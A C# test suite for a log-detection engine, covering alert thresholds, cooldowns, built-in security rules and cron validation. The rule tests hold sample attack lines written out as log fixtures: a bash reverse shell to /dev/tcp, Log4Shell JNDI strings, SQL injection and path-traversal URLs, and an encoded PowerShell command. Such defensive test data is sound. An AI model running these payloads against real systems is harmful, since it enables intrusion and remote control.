using Cabinet.Alerts;
using Cabinet.API.Services;
using Cabinet.Core.Interfaces;
using Cabinet.Core.Models;
using Cabinet.Parsers;
using Cabinet.Query;
using Cabinet.Query.Bql;
using Cabinet.Storage;
using FluentAssertions;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging.Abstractions;
using Moq;
using Xunit;

namespace Cabinet.Tests.Services;

public sealed class DetectionEngineTests
{
    private static readonly DateTime Start = new(2026, 3, 4, 5, 0, 0, DateTimeKind.Utc);

    private readonly InMemoryDocumentStore _documents = new();
    private readonly InMemoryAlertHistoryStorage _history = new();
    private readonly Mock<IAlertService> _alerts = new();
    private readonly DetectionRuleStore _rules;
    private readonly DetectionEngine _engine;

    public DetectionEngineTests()
    {
        var configuration = new ConfigurationBuilder().Build();
        _rules = new DetectionRuleStore(_documents, configuration);
        var dispatcher = new AlertDispatcher(_history, _alerts.Object, NullLogger<AlertDispatcher>.Instance);
        _engine = new DetectionEngine(_rules, dispatcher, NullLogger<DetectionEngine>.Instance);
    }

    private static LogEvent Event(string line, int seconds = 0) => new() { RawLine = line, Timestamp = Start.AddSeconds(seconds) };

    private async Task AddRuleAsync(DetectionRule rule)
    {
        await _rules.SaveAsync(rule);
        _engine.InvalidateRules();
    }

    [Fact]
    public async Task MatchingEvent_FiresAlert_SavesItToHistory_AndSendsIt()
    {
        await AddRuleAsync(new DetectionRule { Name = "Disk", Pattern = "disk full", Severity = "Critical", Technique = "T0000" });
        var logEvent = Event("disk full on /var");

        await _engine.CheckAsync([logEvent, Event("all fine")]);

        var saved = (await _history.GetAlertsAsync()).Should().ContainSingle().Subject;
        saved.SearchName.Should().Be("Disk");
        saved.Severity.Should().Be("Critical");
        saved.EventId.Should().Be(logEvent.Id);
        saved.Technique.Should().Be("T0000");
        _alerts.Verify(a => a.SendAlertAsync(It.Is<Alert>(alert => alert.Severity == AlertSeverity.Critical), It.IsAny<CancellationToken>()), Times.Once);
    }

    [Fact]
    public async Task Condition_UsesBqlAndParsedFields()
    {
        await AddRuleAsync(new DetectionRule { Name = "Slow", Condition = "status >= 500 and host = \"web-1\"" });
        var parser = new ServiceCollection().AddLogging().AddCabinetParsers().BuildServiceProvider().GetRequiredService<LogLineParser>();

        await _engine.CheckAsync([
            await parser.ParseAsync("host=web-1 status=200"),
            await parser.ParseAsync("host=web-2 status=503"),
            await parser.ParseAsync("host=web-1 status=503"),
        ]);

        (await _history.GetAlertsAsync()).Should().ContainSingle();
    }

    [Fact]
    public async Task Threshold_CountsWithinTheWindow_PerGroup()
    {
        await AddRuleAsync(new DetectionRule
        {
            Name = "Brute force",
            Pattern = "failed",
            Extract = @"from (?<src>\S+)",
            GroupBy = "src",
            Threshold = 3,
            WindowSeconds = 60,
        });

        await _engine.CheckAsync([
            Event("failed from a", 0),
            Event("failed from b", 1),
            Event("failed from a", 2),
            Event("failed from b", 3),
        ]);
        (await _history.GetAlertsAsync()).Should().BeEmpty("neither address reached three");

        await _engine.CheckAsync([Event("failed from a", 4)]);

        var alert = (await _history.GetAlertsAsync()).Should().ContainSingle().Subject;
        alert.GroupValue.Should().Be("a");
        alert.ResultCount.Should().Be(3);
    }

    [Fact]
    public async Task EventsOutsideTheWindow_DontCount()
    {
        await AddRuleAsync(new DetectionRule { Name = "Burst", Pattern = "failed", Threshold = 2, WindowSeconds = 10 });

        await _engine.CheckAsync([Event("failed", 0), Event("failed", 100), Event("failed", 200)]);

        (await _history.GetAlertsAsync()).Should().BeEmpty();
    }

    [Fact]
    public async Task Cooldown_StopsRepeats_ButNotForOtherGroups()
    {
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad", Extract = @"from (?<src>\S+)", GroupBy = "src", CooldownSeconds = 3600 });

        await _engine.CheckAsync([Event("bad from a"), Event("bad from a"), Event("bad from a"), Event("bad from b")]);

        (await _history.GetAlertsAsync()).Select(alert => alert.GroupValue).Should().BeEquivalentTo("a", "b");
    }

    [Fact]
    public async Task RetriedEvents_AreNotCountedTwice()
    {
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad", Threshold = 2 });
        var logEvent = Event("bad");

        await _engine.CheckAsync([logEvent]);
        await _engine.CheckAsync([logEvent]);

        (await _history.GetAlertsAsync()).Should().BeEmpty();
    }

    [Fact]
    public async Task DisabledRule_DoesNotRun()
    {
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad", Enabled = false });

        await _engine.CheckAsync([Event("bad")]);

        (await _history.GetAlertsAsync()).Should().BeEmpty();
    }

    [Fact]
    public async Task EventMissingTheGroupField_DoesNotFire()
    {
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad", Extract = @"from (?<src>\S+)", GroupBy = "src" });

        await _engine.CheckAsync([Event("bad, with no source")]);

        (await _history.GetAlertsAsync()).Should().BeEmpty();
    }

    [Fact]
    public async Task InvalidRule_DoesNotStopTheOthers()
    {
        await _documents.PutAsync("detection-rules", "broken", new DetectionRule { Id = "broken", Name = "Broken", Pattern = "(" });
        await AddRuleAsync(new DetectionRule { Name = "Good", Pattern = "bad" });

        await _engine.CheckAsync([Event("bad")]);

        (await _history.GetAlertsAsync()).Should().ContainSingle().Which.SearchName.Should().Be("Good");
    }

    [Fact]
    public async Task FailedDelivery_KeepsTheAlertInHistory()
    {
        _alerts.Setup(a => a.SendAlertAsync(It.IsAny<Alert>(), It.IsAny<CancellationToken>())).ThrowsAsync(new HttpRequestException("down"));
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad" });

        await _engine.CheckAsync([Event("bad")]);

        (await _history.GetAlertsAsync()).Should().ContainSingle();
    }

    [Fact]
    public async Task Storage_HandsEveryIngestRouteToTheEngine()
    {
        await AddRuleAsync(new DetectionRule { Name = "R", Pattern = "bad" });
        await _engine.StartAsync(CancellationToken.None);
        var storage = new DetectingLogStorage(new InMemoryStorage(), _engine);

        (await storage.StoreBatchAsync([Event("bad one")])).Should().Be(1);
        await _engine.WaitUntilIdleAsync();
        await _engine.StopAsync(CancellationToken.None);

        (await _history.GetAlertsAsync()).Should().ContainSingle();
        (await storage.GetCountAsync()).Should().Be(1, "the event is stored as well");
    }

    [Fact]
    public async Task BuiltinRules_AreOffUntilTurnedOn_AndStayOn()
    {
        var before = (await _rules.GetAsync("log4shell"))!;
        before.Enabled.Should().BeFalse();

        await _engine.CheckAsync([Event("${jndi:ldap://evil/a}")]);
        (await _history.GetAlertsAsync()).Should().BeEmpty();

        (await _rules.SetEnabledAsync("log4shell", true)).Should().BeTrue();
        _engine.InvalidateRules();
        await _engine.CheckAsync([Event("${jndi:ldap://evil/b}")]);

        (await _history.GetAlertsAsync()).Should().ContainSingle().Which.Severity.Should().Be("Critical");
    }
}

public sealed class BuiltinDetectionRuleTests
{
    private static readonly LogLineParser Parser = new ServiceCollection().AddLogging().AddCabinetParsers().BuildServiceProvider().GetRequiredService<LogLineParser>();

    /// <summary>Lines each rule has to catch, as real systems write them.</summary>
    public static TheoryData<string, string, string?> Attacks => new()
    {
        { "ssh-brute-force", "Mar  4 05:06:07 web sshd[99]: Failed password for root from 203.0.113.9 port 2200 ssh2", "203.0.113.9" },
        { "ssh-brute-force", "Mar  4 05:06:07 web sshd[99]: Failed password for invalid user bob from 2001:db8::1 port 2200 ssh2", "2001:db8::1" },
        { "ssh-invalid-users", "Mar  4 05:06:07 web sshd[99]: Invalid user admin from 203.0.113.9 port 2200", "203.0.113.9" },
        { "ssh-root-login", "Mar  4 05:06:07 web sshd[99]: Accepted publickey for root from 203.0.113.9 port 2200 ssh2", "203.0.113.9" },
        { "sudo-failures", "Mar  4 05:06:07 web sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000 ruser=bob rhost=  user=bob", "bob" },
        { "sudo-not-allowed", "Mar  4 05:06:07 web sudo:     bob : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/sh", null },
        { "account-created", "Mar  4 05:06:07 web useradd[99]: new user: name=eve, UID=1001, GID=1001", null },
        { "admin-group-change", "Mar  4 05:06:07 web usermod[99]: add 'eve' to group 'sudo'", null },
        { "audit-stopped", "Mar  4 05:06:07 web systemd[1]: Stopped auditd.service - Security Auditing Service.", null },
        { "reverse-shell", "Mar  4 05:06:07 web bash[99]: bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", null },
        { "windows-logon-failures", "2026-03-04T05:06:07Z EventID=4625 An account failed to log on host=dc1", "dc1" },
        { "windows-log-cleared", "2026-03-04T05:06:07Z EventID=1102 The audit log was cleared", null },
        { "windows-service-installed", "2026-03-04T05:06:07Z EventID=7045 A service was installed", null },
        { "powershell-encoded", "CommandLine=powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA", null },
        { "web-sql-injection", "203.0.113.9 - - [04/Mar/2026:05:06:07 +0000] \"GET /item?id=1%20UNION%20SELECT%20password HTTP/1.1\" 200 512", "203.0.113.9" },
        { "web-sql-injection", "203.0.113.9 - - [04/Mar/2026:05:06:07 +0000] \"GET /login?u=a'%20or%20'1'='1 HTTP/1.1\" 200 512", "203.0.113.9" },
        { "web-path-traversal", "203.0.113.9 - - [04/Mar/2026:05:06:07 +0000] \"GET /a/../../../etc/passwd HTTP/1.1\" 404 12", "203.0.113.9" },
        { "web-probing", "203.0.113.9 - - [04/Mar/2026:05:06:07 +0000] \"GET /.env HTTP/1.1\" 404 12", "203.0.113.9" },
        { "web-scanning", "203.0.113.9 - - [04/Mar/2026:05:06:07 +0000] \"GET /nothing HTTP/1.1\" 404 12", "203.0.113.9" },
        { "log4shell", "198.51.100.1 - - \"GET / HTTP/1.1\" 200 1 \"-\" \"${jndi:ldap://203.0.113.9/a}\"", null },
        { "aws-console-failures", "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Failure\"},\"sourceIPAddress\":\"203.0.113.9\"}", "203.0.113.9" },
        { "aws-logging-disabled", "{\"eventName\":\"StopLogging\",\"eventSource\":\"cloudtrail.amazonaws.com\"}", null },
    };

    /// <summary>Everyday lines that look a bit like attacks, which have to stay quiet.</summary>
    public static TheoryData<string, string> Everyday => new()
    {
        { "ssh-brute-force", "Mar  4 05:06:07 web sshd[99]: Accepted password for bob from 203.0.113.9 port 2200 ssh2" },
        { "ssh-root-login", "Mar  4 05:06:07 web sshd[99]: Accepted publickey for bob from 203.0.113.9 port 2200 ssh2" },
        { "sudo-failures", "Mar  4 05:06:07 web sudo:      bob : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/ls" },
        { "account-created", "Mar  4 05:06:07 web app: new user signed up from the website" },
        { "admin-group-change", "Mar  4 05:06:07 web usermod[99]: change user 'bob' shell" },
        { "audit-stopped", "Mar  4 05:06:07 web systemd[1]: Stopped nginx.service." },
        { "reverse-shell", "Mar  4 05:06:07 web app: connected to host via tcp" },
        { "windows-logon-failures", "2026-03-04T05:06:07Z EventID=4624 An account logged on" },
        { "windows-log-cleared", "2026-03-04T05:06:07Z EventID=4624 logged on" },
        { "powershell-encoded", "CommandLine=powershell.exe -File backup.ps1 -Environment production" },
        { "web-sql-injection", "198.51.100.1 - - [04/Mar/2026:05:06:07 +0000] \"GET /articles/union-select-committee HTTP/1.1\" 200 512" },
        { "web-path-traversal", "198.51.100.1 - - [04/Mar/2026:05:06:07 +0000] \"GET /static/app.js HTTP/1.1\" 200 512" },
        { "web-probing", "198.51.100.1 - - [04/Mar/2026:05:06:07 +0000] \"GET /environment HTTP/1.1\" 200 512" },
        { "web-scanning", "198.51.100.1 - - [04/Mar/2026:05:06:07 +0000] \"GET /404 HTTP/1.1\" 200 512" },
        { "log4shell", "198.51.100.1 - - \"GET /docs/${version}/index HTTP/1.1\" 200 1" },
        { "aws-console-failures", "{\"eventName\":\"ConsoleLogin\",\"responseElements\":{\"ConsoleLogin\":\"Success\"},\"sourceIPAddress\":\"203.0.113.9\"}" },
        { "aws-logging-disabled", "{\"eventName\":\"StartLogging\",\"eventSource\":\"cloudtrail.amazonaws.com\"}" },
    };

    private static DetectionRule Rule(string id) => BuiltinDetectionRules.All.Single(rule => rule.Id == id);

    private static BqlEventMatcher Matcher(DetectionRule rule) => new(rule.Pattern, rule.Condition, rule.Extract);

    [Fact]
    public void EveryRule_CompilesAndHasWhatAnAlertNeeds()
    {
        BuiltinDetectionRules.All.Select(rule => rule.Id).Should().OnlyHaveUniqueItems();
        foreach (var rule in BuiltinDetectionRules.All)
        {
            var compile = () => Matcher(rule);
            compile.Should().NotThrow(rule.Id);
            rule.Description.Should().NotBeNullOrEmpty(rule.Id);
            rule.Technique.Should().StartWith("T", rule.Id);
            Enum.TryParse<AlertSeverity>(rule.Severity, out _).Should().BeTrue(rule.Id);
            rule.Enabled.Should().BeFalse(rule.Id);
            if (rule.GroupBy is { Length: > 0 } && rule.GroupBy != "Host")
            {
                rule.Extract.Should().Contain($"?<{rule.GroupBy}>", rule.Id);
            }
        }
    }

    [Fact]
    public void EveryRule_HasAnAttackLineToProveIt()
    {
        var tested = Attacks.Select(row => (string)row[0]).ToHashSet();

        BuiltinDetectionRules.All.Select(rule => rule.Id).Should().OnlyContain(id => tested.Contains(id));
    }

    [Theory]
    [MemberData(nameof(Attacks))]
    public async Task Rule_CatchesItsAttack(string id, string line, string? group)
    {
        var rule = Rule(id);
        var logEvent = await Parser.ParseAsync(line);

        Matcher(rule).TryMatch(logEvent, out var fields).Should().BeTrue(line);

        if (group != null)
        {
            fields[rule.GroupBy!]?.ToString().Should().Be(group, line);
        }
    }

    [Theory]
    [MemberData(nameof(Everyday))]
    public async Task Rule_StaysQuietOnEverydayLines(string id, string line)
    {
        var logEvent = await Parser.ParseAsync(line);

        Matcher(Rule(id)).TryMatch(logEvent, out _).Should().BeFalse(line);
    }
}

public sealed class CronTests
{
    private static readonly DateTime Noon = new(2026, 3, 4, 12, 0, 20, DateTimeKind.Utc);

    private static ScheduledSearch Search(string cron, DateTime? lastRun = null) =>
        new() { Name = "s", Query = "find *", CronExpression = cron, LastRunAt = lastRun };

    [Theory]
    [InlineData("* * * * *")]
    [InlineData("*/5 * * * *")]
    [InlineData("0 9-17 * * 1-5")]
    [InlineData("0,15,30,45 * * * *")]
    [InlineData("5/10 * 1 1 0")]
    [InlineData("10-20/2 * * * *")]
    public void ValidExpressions_Pass(string cron)
    {
        ScheduledSearchService.ValidateCron(cron).Should().BeNull();
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("* * * *")]
    [InlineData("* * * * * *")]
    [InlineData("60 * * * *")]
    [InlineData("* 24 * * *")]
    [InlineData("* * 0 * *")]
    [InlineData("* * * 13 *")]
    [InlineData("* * * * 7")]
    [InlineData("*/0 * * * *")]
    [InlineData("*/x * * * *")]
    [InlineData("99999999999 * * * *")]
    [InlineData("*/2147483647 * * * *a")]
    [InlineData("5-1 * * * *")]
    [InlineData("abc * * * *")]
    public void InvalidExpressions_FailWithAReason(string? cron)
    {
        ScheduledSearchService.ValidateCron(cron).Should().NotBeNullOrEmpty();
    }

    [Fact]
    public void HugeStep_Terminates()
    {
        // It used to add the step until the integer overflowed, and hang
        ScheduledSearchService.MatchesCron("*/2147483647 * * * *", new DateTime(2026, 3, 4, 12, 1, 0)).Should().BeFalse();
    }

    [Fact]
    public void RunsOncePerMinute_HoweverOftenItsChecked()
    {
        var minute = new DateTime(2026, 3, 4, 12, 0, 0, DateTimeKind.Utc);

        ScheduledSearchService.ShouldRun(Search("* * * * *"), Noon).Should().BeTrue();
        ScheduledSearchService.ShouldRun(Search("* * * * *", minute.AddSeconds(1)), minute.AddSeconds(59)).Should().BeFalse();
        ScheduledSearchService.ShouldRun(Search("* * * * *", minute.AddSeconds(59)), minute.AddSeconds(61)).Should().BeTrue();
    }

    [Fact]
    public void MinuteMissedWhileBusy_StillRuns()
    {
        // Due at 12:00. A slow check means the next look is at 12:02.
        var search = Search("0 12 * * *", new DateTime(2026, 3, 3, 12, 0, 0, DateTimeKind.Utc));
        var now = new DateTime(2026, 3, 4, 12, 2, 5, DateTimeKind.Utc);

        ScheduledSearchService.ShouldRun(search, now, new DateTime(2026, 3, 4, 11, 59, 0, DateTimeKind.Utc)).Should().BeTrue();
        ScheduledSearchService.ShouldRun(search, now, new DateTime(2026, 3, 4, 12, 1, 0, DateTimeKind.Utc)).Should().BeFalse();
    }
}
